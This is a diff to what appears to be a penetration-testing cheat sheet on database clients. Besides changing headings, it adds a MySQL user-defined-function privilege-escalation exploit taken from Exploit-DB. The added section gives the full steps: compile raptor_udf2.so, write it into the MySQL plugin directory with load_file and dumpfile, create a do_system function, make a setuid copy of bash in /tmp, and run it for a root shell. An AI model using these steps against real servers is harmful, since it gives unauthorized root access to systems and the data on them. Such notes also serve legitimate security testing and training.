@@ -1,4 +1,4 @@
-## MySQL Server
+# MySQL Server
 
 ```bash
 # Install MySQL client tool
@@ -14,7 +14,32 @@ mysql> select version();
 mysql> show databases;
 ```
 
-## SQLite3
+### User-Defined Function MySQL 4.x/5.0 Exploit
+
+[MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library](https://www.exploit-db.com/exploits/1518)
+
+```bash
+# Compile exploit library
+gcc -g -c raptor_udf2.c -fPIC
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+
+# Access MySQL
+mysql -u root -p
+
+# Exploiting
+mysql> use mysql;
+mysql> create table foo(line blob);
+mysql> insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
+mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+mysql> create function do_system returns integer soname 'raptor_udf2.so';
+mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+mysql> \q
+
+# Gain root
+/tmp/rootbash -p
+```
+
+# SQLite3
 
 ```bash
 # Install SQLite client tool
